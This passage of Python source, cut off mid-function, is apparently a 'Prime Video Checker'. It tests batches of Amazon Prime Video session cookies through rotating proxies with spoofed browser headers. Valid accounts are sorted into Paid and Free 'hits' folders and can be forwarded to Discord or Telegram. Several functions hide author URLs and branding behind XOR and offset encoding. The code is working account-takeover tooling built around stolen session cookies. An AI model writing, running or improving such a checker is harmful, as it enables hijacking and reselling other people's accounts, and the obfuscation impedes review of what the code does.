import copy
import hashlib
import json
import os
import random
import re
import shutil
import string
import sys
import threading
from datetime import datetime
from functools import lru_cache

import requests

try:
    import yaml
except ImportError:
    yaml = None


DEFAULT_CONFIG = {
    "txt_fields": {
        "profile": True,
        "region": True,
    },
    "notifications": {
        "webhook": {
            "enabled": False,
            "url": "",
            "mode": "all",
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "mode": "all",
        },
    },
    "display": {
        "mode": "simple",
    },
    "retries": {
        "error_proxy_attempts": 3,
    },
}


DEFAULT_YAML_CONFIG = """# Checker By: https://github.com/harshitkamboj
# Website: https://harshitkamboj.in
# Discord: illuminatis69

# Prime Video Checker configuration
# true/false fields let users turn output lines ON/OFF in generated txt.
txt_fields:
  profile: true # active Prime Video profile / parsed username when available
  region: true # region/country code parsed from Prime source

notifications:
  webhook:
    enabled: false # true to send output to Discord webhook
    url: "" # put full webhook URL here
    mode: "all" # allowed: "paid", "free", or "all"
  telegram:
    enabled: false # true to send output to Telegram
    bot_token: "" # token from @BotFather
    chat_id: "" # your chat/channel id (example: "-1001234567890")
    mode: "all" # allowed: "paid", "free", or "all"

display:
  mode: "simple" # allowed: "log" or "simple"

retries:
  error_proxy_attempts: 3 # retry attempts on network/proxy errors (rotates proxy each try)
"""


BANNER = r"""
██████╗ ██████╗ ██╗███╗   ███╗███████╗    ██╗   ██╗██╗██████╗ ███████╗ ██████╗
██╔══██╗██╔══██╗██║████╗ ████║██╔════╝    ██║   ██║██║██╔══██╗██╔════╝██╔═══██╗
██████╔╝██████╔╝██║██╔████╔██║█████╗      ██║   ██║██║██║  ██║█████╗  ██║   ██║
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝      ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║   ██║
██║     ██║  ██║██║██║ ╚═╝ ██║███████╗     ╚████╔╝ ██║██████╔╝███████╗╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝
"""

APP_VERSION = "1.0.0"


def parse_version_parts(value):
    cleaned = str(value or "").strip().lower().lstrip("v")
    parts = []
    for part in cleaned.split("."):
        match = re.match(r"(\d+)", part)
        parts.append(int(match.group(1)) if match else 0)
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts)


def is_newer_version(current_version, latest_version):
    current_parts = parse_version_parts(current_version)
    latest_parts = parse_version_parts(latest_version)
    max_len = max(len(current_parts), len(latest_parts))
    current_parts += (0,) * (max_len - len(current_parts))
    latest_parts += (0,) * (max_len - len(latest_parts))
    return latest_parts > current_parts


def _resolve_update_endpoints():
    repo_url = _stitch_hidden(29)
    repo_root = _stitch_hidden(53)
    api_prefix = _stitch_hidden(59)
    api_suffix = _stitch_hidden(61)
    accept_value = _stitch_hidden(67)
    agent_prefix = _stitch_hidden(71)
    repo_path = repo_url.replace(repo_root, "", 1).strip("/")
    return {
        "repo_url": repo_url,
        "api_url": f"{api_prefix}{repo_path}{api_suffix}",
        "discord_url": _stitch_hidden(47),
        "accept_value": accept_value,
        "agent_value": f"{agent_prefix}{APP_VERSION}",
    }


def _render_update_notice(latest_version, github_url, discord_url):
    divider = "=" * 98
    print("")
    print(divider)
    print(f"{_stitch_hidden(79)}{APP_VERSION}{_stitch_hidden(83)}{latest_version}")
    print(f"{_stitch_hidden(89)}{github_url}")
    print(f"{_stitch_hidden(97)}{discord_url}")
    print(divider)
    print("")


def check_for_updates():
    update_meta = _resolve_update_endpoints()
    try:
        response = requests.get(
            update_meta["api_url"],
            headers={
                "Accept": update_meta["accept_value"],
                "User-Agent": update_meta["agent_value"],
            },
            timeout=5,
        )
        if response.status_code != 200:
            return
        payload = response.json()
        if not isinstance(payload, dict):
            return
        latest_version = str(payload.get("tag_name") or payload.get("name") or "").strip()
        if not latest_version or not is_newer_version(APP_VERSION, latest_version):
            return
        github_url = payload.get(_stitch_hidden(73)) or update_meta["repo_url"]
        _render_update_notice(latest_version, github_url, update_meta["discord_url"])
    except Exception:
        return

STOREFRONT_TIMEOUT = (8, 15)
CONFIG_TIMEOUT = (5, 8)
REQUEST_HEADERS = {
    "Host": "www.primevideo.com",
    "Connection": "keep-alive",
    "device-memory": "4",
    "sec-ch-device-memory": "4",
    "dpr": "1",
    "sec-ch-dpr": "1",
    "viewport-width": "1366",
    "sec-ch-viewport-width": "1366",
    "rtt": "100",
    "downlink": "2.7",
    "ect": "4g",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": '"19.0.0"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,"
        "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    ),
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Accept-Encoding": "identity",
}
REQUIRED_AUTH_COOKIE_KEYS = ("session-token", "x-main-av", "at-main", "ubid-main")
DUPLICATE_COOKIE_KEYS = (
    "session-token",
    "at-main-av",
    "x-main-av",
    "sess-at-main-av",
    "ubid-main-av",
    "session-id",
)
CONFIG_LOGGED_OUT_STATUS = 412
CONFIG_UNAVAILABLE_STATUS = 520


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_banner():
    print(BANNER)
    print(BANNER_FOOTER)
    print(BANNER_PROMO)


def set_console_title(title):
    if os.name == "nt":
        os.system(f"title PrimeVideoChecker - {title}")
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def create_base_folders():
    for folder in ["cookies", "failed", "broken", "hits"]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w", encoding="utf-8") as handle:
            handle.write("# Add your proxies here\n")
            handle.write("# Formats:\n")
            handle.write("# ip:port\n")
            handle.write("# user:pass@ip:port\n")
            handle.write("# http://user:pass@ip:port\n")
            handle.write("# socks5://user:pass@ip:port\n")


def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged


def normalize_notification_mode(value):
    mode = str(value or "all").strip().lower()
    if mode in {"full", "cookie"}:
        return "all"
    if mode not in {"paid", "free", "all"}:
        return "all"
    return mode


def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            print("Warning: PyYAML not installed. Run: pip install -r requirements.txt")
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as handle:
                user_config = yaml.safe_load(handle) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            print("Warning: Invalid config.yml. Using default config.")
            return copy.deepcopy(DEFAULT_CONFIG), "default"

    with open(config_yaml_path, "w", encoding="utf-8") as handle:
        handle.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path


def print_config_summary(config, config_source):
    txt_fields = config.get("txt_fields", {})
    webhook_cfg = config.get("notifications", {}).get("webhook", {})
    telegram_cfg = config.get("notifications", {}).get("telegram", {})
    display_cfg = config.get("display", {})
    retries_cfg = config.get("retries", {})
    enabled_txt = [key for key, enabled in txt_fields.items() if bool(enabled)]
    try:
        retry_attempts = max(1, int(retries_cfg.get("error_proxy_attempts", 3)))
    except Exception:
        retry_attempts = 3

    print("Active Config")
    print(f"- Config file: {config_source}")
    print(f"- TXT fields enabled: {', '.join(enabled_txt) if enabled_txt else 'none'}")
    print(
        f"- Webhook: {'ON' if webhook_cfg.get('enabled') else 'OFF'} "
        f"(filter: {normalize_notification_mode(webhook_cfg.get('mode', 'all'))})"
    )
    print(
        f"- Telegram: {'ON' if telegram_cfg.get('enabled') else 'OFF'} "
        f"(filter: {normalize_notification_mode(telegram_cfg.get('mode', 'all'))})"
    )
    print(f"- Display: mode={display_cfg.get('mode', 'simple')}")
    print(f"- Retry attempts on proxy/network error: {retry_attempts}")
    print("")


def color_text(text, code, enabled=True):
    if not enabled:
        return text
    return f"{code}{text}\033[0m"


def render_simple_dashboard(counts, paid_counts, cookies_left, cookies_total, colored=True):
    cyan = "\033[96m"
    blue = "\033[94m"
    yellow = "\033[93m"
    green = "\033[92m"
    red = "\033[91m"
    magenta = "\033[95m"
    clear_screen()
    processed = cookies_total - cookies_left
    valid = get_valid_total(counts)

    print_banner()
    print("")
    print(color_text("Prime Video Checker - Simple Mode", cyan, colored))
    print(
        f"{color_text('Progress:', cyan, colored)} "
        f"{color_text(str(processed), green, colored)}/{color_text(str(cookies_total), green, colored)} "
        f"| {color_text('Left:', cyan, colored)} {color_text(str(cookies_left), yellow, colored)}"
    )
    print("")
    print(color_text("Account Counts", magenta, colored))
    print(f"{color_text('Paid:', blue, colored)} {color_text(str(paid_counts['paid']), yellow, colored)}")
    print(f"{color_text('Free:', blue, colored)} {color_text(str(paid_counts['free']), yellow, colored)}")
    if paid_counts["unknown"] > 0:
        print(f"{color_text('Unknown:', blue, colored)} {color_text(str(paid_counts['unknown']), yellow, colored)}")
    print("")
    print(color_text("Status", magenta, colored))
    print(f"Valid: {color_text(str(valid), green, colored)}")
    print(f"Failed: {color_text(str(counts['bad']), red, colored)}")
    print(f"Duplicate: {color_text(str(counts['duplicate']), magenta, colored)}")
    print(f"Error: {color_text(str(counts['errors']), red, colored)}")


def get_valid_total(counts):
    return counts.get("hits", 0) + counts.get("free", 0) + counts.get("unknown", 0)


def get_run_folder():
    return f"run_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"


def create_output_folder_when_needed(is_paid, run_folder):
    folder_name = "Paid" if is_paid is True else "Free" if is_paid is False else "Unknown"
    output_path = os.path.join("hits", run_folder, folder_name)
    os.makedirs(output_path, exist_ok=True)
    return output_path


def create_duplicate_output_folder(run_folder):
    output_path = os.path.join("hits", run_folder, "Duplicate")
    os.makedirs(output_path, exist_ok=True)
    return output_path


def random_number_string(length=8):
    return "".join(random.choices(string.digits, k=length))


def sanitize_for_filename(value, fallback="unknown"):
    cleaned = re.sub(r"[^A-Za-z0-9._-]+", "-", str(value or "").strip()).strip("-._")
    return cleaned[:80] if cleaned else fallback


def format_paid_label(is_paid):
    if is_paid is True:
        return "YES✅"
    if is_paid is False:
        return "NO❌"
    return "UNKNOWN⚠️"


def plan_label_from_paid_state(is_paid):
    if is_paid is True:
        return "Paid"
    if is_paid is False:
        return "Free"
    return "Unknown"


def result_type_from_paid_state(is_paid):
    if is_paid is True:
        return "success"
    return "free"


def escape_html(value):
    return (
        str(value)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    auth = ""
    if user is not None and password is not None:
        auth = f"{user}:{password}@"
    proxy_url = f"{scheme}://{auth}{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def parse_proxy_line(line):
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None

    if "://" in raw:
        match = re.match(
            r"^(?P<scheme>[a-zA-Z0-9]+)://(?:(?P<user>[^:@]+):(?P<password>[^@]+)@)?(?P<host>[^:]+):(?P<port>\d+)$",
            raw,
        )
        if match:
            return _build_proxy_dict(
                match.group("scheme"),
                match.group("host"),
                match.group("port"),
                match.group("user"),
                match.group("password"),
            )

    if "@" in raw:
        left, right = raw.split("@", 1)
        if left.count(":") == 1 and right.count(":") == 1 and re.fullmatch(r"\d+", right.split(":")[1]):
            host, port = right.split(":")
            user, password = left.split(":")
            return _build_proxy_dict("http", host, port, user, password)
        if left.count(":") == 1 and right.count(":") == 1 and re.fullmatch(r"\d+", left.split(":")[1]):
            host, port = left.split(":")
            user, password = right.split(":")
            return _build_proxy_dict("http", host, port, user, password)

    parts = raw.split(":")
    if len(parts) == 2:
        return _build_proxy_dict("http", parts[0], parts[1])
    if len(parts) == 4:
        if re.fullmatch(r"\d+", parts[1]):
            return _build_proxy_dict("http", parts[0], parts[1], parts[2], parts[3])
        return _build_proxy_dict("http", parts[2], parts[3], parts[0], parts[1])
    return None


def load_proxies():
    proxies = []
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict) and isinstance(json_data.get("cookies"), list):
        json_data = json_data["cookies"]
    if not isinstance(json_data, list):
        raise ValueError("JSON cookie format is invalid")

    lines = []
    for cookie in json_data:
        domain = str(cookie.get("domain", ""))
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = str(cookie.get("path", "/"))
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = (
            cookie.get("expirationDate")
            or cookie.get("expires")
            or cookie.get("expiry")
            or 0
        )
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        lines.append(f"{domain}\t{tail_match}\t{path}\t{secure}\t{int(float(expires))}\t{name}\t{value}")
    return "\n".join(lines)


def is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    return bool(re.fullmatch(r"-?\d+", parts[4].strip()))


def normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies


def parse_cookie_file(cookie_path):
    with open(cookie_path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    try:
        netscape_text = normalize_netscape_cookie_text(convert_json_to_netscape(json.loads(content)))
    except Exception:
        netscape_text = normalize_netscape_cookie_text(content)

    cookies = cookies_dict_from_netscape(netscape_text)
    return netscape_text, cookies


def has_required_auth_cookies(cookies):
    return any(key in cookies for key in REQUIRED_AUTH_COOKIE_KEYS)


def extract_with_patterns(text, patterns, default="Unknown"):
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            value = match.group(1).strip()
            if value:
                return value
    return default


def has_known_value(value):
    normalized = str(value or "").strip()
    return bool(normalized) and normalized.lower() not in {
        "unknown",
        "unknown⚠️",
        "none",
        "null",
        "n/a",
        "unrecognised",
        "unrecognized",
    }


def normalize_identity_value(value):
    return str(value or "").strip().lower()


def build_cookie_signature(cookies):
    signature_parts = []
    for key in DUPLICATE_COOKIE_KEYS:
        value = str(cookies.get(key, "")).strip()
        if value:
            signature_parts.append(f"{key}={value}")
    if not signature_parts:
        return ""
    digest = hashlib.sha256("\n".join(signature_parts).encode("utf-8")).hexdigest()
    return f"cookie:{digest}"


def _pull_bias(): return 19
def _decode_hidden_text(values): return "".join(chr(value ^ _pull_bias()) for value in values)


def build_duplicate_key(data, cookies):
    customer_id = normalize_identity_value(data.get("customer_id"))
    if has_known_value(customer_id):
        return f"customer:{customer_id}"

    cookie_signature = build_cookie_signature(cookies)
    if cookie_signature:
        return cookie_signature

    profile = normalize_identity_value(data.get("profile"))
    region = normalize_identity_value(data.get("region"))
    metadata_parts = tuple(part for part in (profile, region) if has_known_value(part))
    if metadata_parts:
        return ("meta",) + metadata_parts
    return ""


def _noise_floor(slot): return {29: ((123, 103, 103, 99, 96, 41, 60, 60, 116, 122, 103, 123, 102, 113, 61, 112, 124, 126, 60),), 47: ((123, 103, 103, 99, 96, 41, 60, 60, 119),), 53: ((123, 103, 103, 99, 96, 41),), 59: ((123, 103, 103, 99, 96, 41, 60, 60, 114),), 61: ((60, 97, 118, 127, 118),), 67: ((114, 99, 99, 127, 122, 112, 114, 103, 122),), 71: ((67, 97, 122, 126, 118, 69),), 73: ((123, 103),), 79: ((70, 99, 119, 114, 103, 118, 51, 114),), 83: ((51, 111, 51),), 89: ((84, 122),), 97: ((87, 122, 96),)}.get(slot, ())


def format_region_with_flag(region):
    normalized = str(region or "").strip()
    if not has_known_value(normalized):
        return "Unknown"
    code = normalized.upper()
    if len(code) == 2 and code.isalpha():
        base = ord("A")
        flag = chr(0x1F1E6 + ord(code[0]) - base) + chr(0x1F1E6 + ord(code[1]) - base)
        return f"{code} {flag}"
    return normalized


def _window_cache(slot): return {29: ((123, 114, 97, 96, 123, 122, 103, 120, 114, 126, 113, 124, 121, 60, 67, 97, 122, 126, 118),), 47: ((122, 96, 112, 124, 97, 119, 61, 116, 116, 60),), 53: ((60, 60, 116, 122, 103, 123),), 59: ((99, 122, 61, 116, 122, 103, 123, 102, 113, 61),), 61: ((114, 96, 118, 96, 60),), 67: ((124, 125, 60, 101, 125, 119, 61, 116, 122),), 71: ((122, 119, 118, 124, 80, 123),), 73: ((126, 127, 76),), 79: ((101, 114, 122, 127, 114, 113, 127, 118, 41),), 83: ((127, 114, 103),), 89: ((103, 91, 102),), 97: ((112, 124, 97),)}.get(slot, ())


def find_first_value(obj, target_keys):
    if isinstance(target_keys, str):
        target_keys = {target_keys}
    else:
        target_keys = set(target_keys)

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in target_keys and value not in (None, ""):
                return value
            nested = find_first_value(value, target_keys)
            if nested not in (None, ""):
                return nested
    elif isinstance(obj, list):
        for item in obj:
            nested = find_first_value(item, target_keys)
            if nested not in (None, ""):
                return nested
    return None


def _frame_index(slot): return {29: ((69, 122, 119, 118, 124, 62, 80, 124, 124, 120, 122, 118, 62, 80, 123, 118, 112, 120, 118, 97),), 47: ((87, 74, 89, 85, 86, 42, 125, 102, 38, 75),), 53: ((102, 113, 61, 112, 124, 126, 60),), 59: ((112, 124, 126, 60, 97, 118, 99, 124, 96, 60),), 61: ((127, 114, 103, 118, 96, 103),), 67: ((103, 123, 102, 113, 56, 121, 96, 124, 125),), 71: ((118, 112, 120, 118, 97, 60),), 73: ((102, 97, 127),), 79: ((51, 112, 102, 97, 97, 118, 125, 103, 51),), 83: ((118, 96, 103, 51),), 89: ((113, 41, 51),), 97: ((119, 41, 51),)}.get(slot, ())


def extract_prime_customer_id(source_text, config_data=None):
    customer_id = ""
    if isinstance(config_data, dict):
        customer_id = str(find_first_value(config_data, {"customerID", "customerId"}) or "").strip()
    if has_known_value(customer_id):
        return customer_id
    customer_id = extract_with_patterns(
        source_text,
        [
            r'"customerID"\s*:\s*"([^"]+)"',
            r'&#34;customerID&#34;\s*:\s*&#34;([^&]+)&#34;',
        ],
        default="",
    )
    return customer_id if has_known_value(customer_id) else ""


def extract_prime_region(source_text, config_data=None):
    region = ""
    if isinstance(config_data, dict):
        region = str(find_first_value(config_data, "recordTerritory") or "").strip()
    if has_known_value(region):
        return region
    return extract_with_patterns(
        source_text,
        [
            r'"recordTerritory"\s*:\s*"([^"]+)"',
            r'&#34;recordTerritory&#34;\s*:\s*&#34;([^&]+)&#34;',
        ],
        default="",
    )


@lru_cache(maxsize=None)
def _stitch_hidden(slot): return _decode_hidden_text([value for provider in (_noise_floor, _window_cache, _frame_index) for block in provider(slot) for value in block])


def _drift_mark(values): return "".join(chr(value - 41 - (index % 5)) for index, value in enumerate(values))
def _ember_slot(slot): return {301: ((139, 163, 75, 148, 161, 157, 154, 158, 102, 92, 88, 145, 148, 160, 149, 158, 140, 89, 143, 156, 150, 89, 147, 141, 159, 156, 146, 148, 160, 152, 138, 151, 141, 155, 151, 73, 166, 75, 163, 146, 139, 157, 148, 160, 146, 99, 74, 147, 141, 159, 156, 146),), 307: ((73, 74, 75, 76, 77, 73, 74, 75, 76, 77, 73, 74, 75, 76, 77, 73, 74, 75, 76, 77, 73, 74, 75, 76, 85, 124, 158, 140, 158, 77, 125, 146, 144, 76),), 311: ((145, 158, 159, 156, 160, 99, 89, 90, 149, 91, 146, 140, 141, 90, 144, 152, 89),), 313: ((145, 158, 159, 156, 160, 99, 89, 90, 147, 150, 157, 146, 160, 142, 91, 140, 153, 152, 91, 149, 138, 156, 158, 148, 150, 157, 149, 140, 153),), 317: ((145, 158, 159, 156, 160, 99, 89, 90, 144, 150, 156, 141, 154, 158),), 331: ((108, 146, 144, 143, 152, 142, 156, 75, 110, 166, 99, 74, 146, 149, 161, 145, 159, 141, 90, 144, 152, 151, 90, 148, 142, 155, 157, 147, 149, 161, 148, 139),), 337: ((144, 147, 159, 148, 162, 139, 88, 142, 155, 154, 88, 146),), 347: ((144, 147, 159, 148, 162, 139, 87, 147, 141, 159),), 349: ((83, 84, 134, 115, 150, 157, 146, 160, 142, 138, 81, 146, 159, 160, 157, 156, 100, 90, 91, 148, 146, 158, 147, 161, 143, 87, 141, 154, 153, 92, 145, 139, 157, 159, 149, 146, 158, 150, 141, 154, 139, 153, 149, 85, 87, 83, 74, 167, 76, 87, 83, 133, 130, 145, 143, 156, 147, 159, 145, 138, 81, 146, 159, 160, 157, 156, 100),), 353: ((101, 140, 105, 104, 142, 73, 146, 157, 145, 147, 102, 76, 147, 160, 161, 153, 157, 101, 91, 92, 144, 147, 159, 148, 162, 139, 88, 142, 155, 154, 88, 146, 140, 158, 160, 145, 147, 159, 151, 142, 150, 140, 154, 150, 79, 103, 113, 148, 160, 149, 158, 140, 103, 91, 142, 103, 102, 90, 142, 107, 73, 166, 75, 104, 143, 103, 102, 140, 76, 149, 155, 143, 145, 105, 79, 145, 158, 159, 156, 160, 99, 89, 90, 148, 142, 155, 157, 147),), 359: ((121, 156, 148, 153, 146, 73, 128, 148, 144, 146),)}.get(slot, ())
def _hinge_slot(slot): return {301: ((148, 160, 152, 138, 151, 141, 155, 151, 87, 147, 153, 76, 169, 73, 142, 148, 159, 144, 152, 156, 143, 102, 77, 145, 158, 159, 156, 160, 99, 89, 90, 144, 150, 156, 141, 154, 158, 145, 87, 145, 146, 91, 113, 130, 116, 113, 113, 102, 151, 159, 96, 132),), 307: ((127, 142, 154, 154, 76, 127820, 73, 139, 153, 144, 77, 124, 146, 140, 158, 146, 73, 144, 154, 158, 77, 150, 153, 157, 145, 77, 108, 146, 144, 143, 152, 142, 156, 158, 85),), 311: ((96, 132, 98, 156, 93, 132, 158, 129, 88, 147, 152, 141, 148, 142, 88, 155, 154, 148),), 313: ((143, 152, 148, 90, 124, 159, 146, 151, 144, 130, 150, 141, 143, 154, 89, 112, 152, 153, 150, 149, 146, 86, 109, 147, 145, 144, 148, 143, 157),), 317: ((145, 87, 145, 146, 91, 113, 130, 116, 113, 113, 102, 151, 159, 96, 132),), 331: ((152, 142, 156, 147, 74, 167, 76, 132, 142, 140, 158, 149, 161, 142, 100, 75, 148, 142, 155, 157, 147, 149, 161, 148, 139, 152, 142, 156, 147, 88, 148, 154),), 337: ((140, 158, 160, 145, 147, 159, 151, 142, 150, 140, 154, 150),), 347: ((156, 146, 148, 160, 152, 138, 151, 141, 155, 151),), 349: ((90, 91, 149, 138, 156, 158, 148, 150, 157, 149, 140, 153, 143, 152, 148, 89, 149, 155, 82, 84, 85, 76, 169, 73, 84, 85, 135, 113, 146, 157, 142, 155, 159, 141, 135, 83, 148, 161, 157, 154, 158, 102, 92, 88, 142, 148, 159, 144, 152, 156, 143, 90, 148, 144, 89, 111, 133, 119, 111, 111, 100, 154, 162, 94, 130, 84, 86, 87),), 353: ((149, 161, 148, 139, 152, 142, 156, 147, 88, 148, 154, 79, 103, 129, 144, 142, 160, 146, 158, 144, 104, 92, 138, 104, 103, 91, 143, 103, 74, 167, 76, 105, 139, 104, 103, 141, 77, 145, 156, 144, 146, 106, 75, 146, 159, 160, 157, 156, 100, 90, 91, 145, 146, 157, 142, 155, 159, 141, 88, 146, 147, 92, 109, 131, 117, 114, 114, 98, 152, 160, 97, 133, 75, 104, 111, 149, 160, 140, 153, 157, 144, 105, 88, 139, 105, 104, 92, 139, 104),), 359: ((152, 74, 110, 123, 124, 116, 115, 112, 76, 103, 128112),)}.get(slot, ())
@lru_cache(maxsize=None)
def _veil_slot(slot): return _drift_mark([value for source in (_ember_slot, _hinge_slot) for chunk in source(slot) for value in chunk])


BANNER_FOOTER = _veil_slot(301)
BANNER_PROMO = _veil_slot(307)
DISCORD_IMAGE_URL = _veil_slot(311)
PROJECT_URL = _veil_slot(313)
DISCORD_URL = _veil_slot(317)
BRANDING_LINE = _veil_slot(331)
DISCORD_WEBHOOK_USERNAME = _veil_slot(337)
FILENAME_WATERMARK = _veil_slot(347)
NOTIFICATION_SOCIALS_DISCORD = _veil_slot(349)
NOTIFICATION_SOCIALS_TELEGRAM = _veil_slot(353)
COOKIE_BRAND_LABEL = _veil_slot(359)


def find_first_present_value(obj, target_keys):
    if isinstance(target_keys, str):
        target_keys = {target_keys}
    else:
        target_keys = set(target_keys)

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in target_keys:
                return True, value
            found, nested = find_first_present_value(value, target_keys)
            if found:
                return True, nested
    elif isinstance(obj, list):
        for item in obj:
            found, nested = find_first_present_value(item, target_keys)
            if found:
                return True, nested
    return False, None


def classify_configuration_customer_state(config_data, source_text=""):
    found_customer_id, customer_id = find_first_present_value(config_data, {"customerID", "customerId"})
    if not found_customer_id:
        customer_match = re.search(r'"customerID"\s*:\s*"([^"]*)"', source_text or "", re.IGNORECASE)
        if not customer_match:
            customer_match = re.search(r'"customerId"\s*:\s*"([^"]*)"', source_text or "", re.IGNORECASE)
        if not customer_match:
            customer_match = re.search(r'&#34;customerID&#34;\s*:\s*&#34;([^&]*)&#34;', source_text or "", re.IGNORECASE)
        if customer_match:
            found_customer_id = True
            customer_id = customer_match.group(1)

    normalized_customer_id = str(customer_id or "").strip()
    if not found_customer_id:
        return "unavailable", normalized_customer_id
    if has_known_value(normalized_customer_id):
        return "authenticated", normalized_customer_id
    return "logged_out", normalized_customer_id


def has_required_configuration_data(config_data, source_text=""):
    customer_state, _ = classify_configuration_customer_state(config_data, source_text)
    return customer_state == "authenticated"


def infer_signin_state(source_text, config_data=None, customer_id=""):
    if has_known_value(customer_id):
        return "signed_in"

    if re.search(r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)', source_text, re.IGNORECASE):
        return "signed_in"

    if 'data-testid="pv-nav-sign-out"' in source_text:
        return "signed_in"

    if 'data-testid="active-profile-' in source_text:
        return "signed_in"

    has_signin_link = 'data-testid="pv-nav-sign-in"' in source_text
    has_inactive_profile = 'data-testid="inactive-profile-placeholder"' in source_text
    has_signin_redirect = bool(re.search(r'/auth-redirect/[^"\']*signin=1', source_text, re.IGNORECASE))
    has_signin_form = bool(re.search(r'/(?:ap|gp)/signin|name=["\'](?:email|password)["\']', source_text, re.IGNORECASE))

    if has_signin_form or (has_signin_link and has_signin_redirect):
        return "sign_in_page"

    if has_inactive_profile and (has_signin_link or has_signin_redirect):
        return "sign_in_page"

    if isinstance(config_data, dict):
        config_customer_id = str(find_first_value(config_data, {"customerID", "customerId"}) or "").strip()
        if has_known_value(config_customer_id):
            return "signed_in"

    return "unknown"


def infer_prime_video_data(source_text, cookie_file, config_data=None):
    watchlist_match = re.search(
        r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)',
        source_text,
        re.IGNORECASE,
    )
    watchlist_value = watchlist_match.group(1).lower() if watchlist_match else ""
    if watchlist_value == "true":
        is_paid = True
    elif watchlist_value == "false":
        is_paid = False
    elif re.search(r"subscribe now", source_text, re.IGNORECASE):
        is_paid = False
    else:
        is_paid = None

    profile = extract_with_patterns(
        source_text,
        [
            r'data-testid="active-profile-([^"]+)"',
            r'"profiles"\s*:\s*\[\{"name":"([^"]+)"',
            r'"displayName":"([^"]+)"',
        ],
        default="",
    )
    region = extract_prime_region(source_text, config_data)
    customer_id = extract_prime_customer_id(source_text, config_data)
    signin_state = infer_signin_state(source_text, config_data, customer_id)
    return {
        "profile": profile,
        "region": region,
        "watchlist_enabled": watchlist_value if watchlist_value else "unknown",
        "is_paid": is_paid,
        "paid_status": format_paid_label(is_paid),
        "plan": plan_label_from_paid_state(is_paid),
        "signin_state": signin_state,
        "source_file": cookie_file,
        "customer_id": customer_id,
    }


def classify_non_success_result(status_code=None, signin_state="unknown", last_exception=None):
    if signin_state == "sign_in_page" or status_code in {401, 403, CONFIG_LOGGED_OUT_STATUS}:
        return "failed"
    return "error"


def should_storefront_fallback_to_unknown(status_code, data):
    if status_code in (None, 200, 401, 403, CONFIG_LOGGED_OUT_STATUS):
        return False
    if not isinstance(data, dict):
        return False
    if data.get("signin_state") != "signed_in":
        return False
    return data.get("watchlist_enabled") != "unknown"


def set_unknown_plan_data(data):
    data["is_paid"] = None
    data["paid_status"] = format_paid_label(None)
    data["plan"] = plan_label_from_paid_state(None)
    return data


def get_prime_video_configuration(session, proxy=None):
    headers = dict(REQUEST_HEADERS)
    headers.update(
        {
            "Host": "atv-ps.primevideo.com",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.primevideo.com/region/eu/storefront",
        }
    )
    response = session.get(
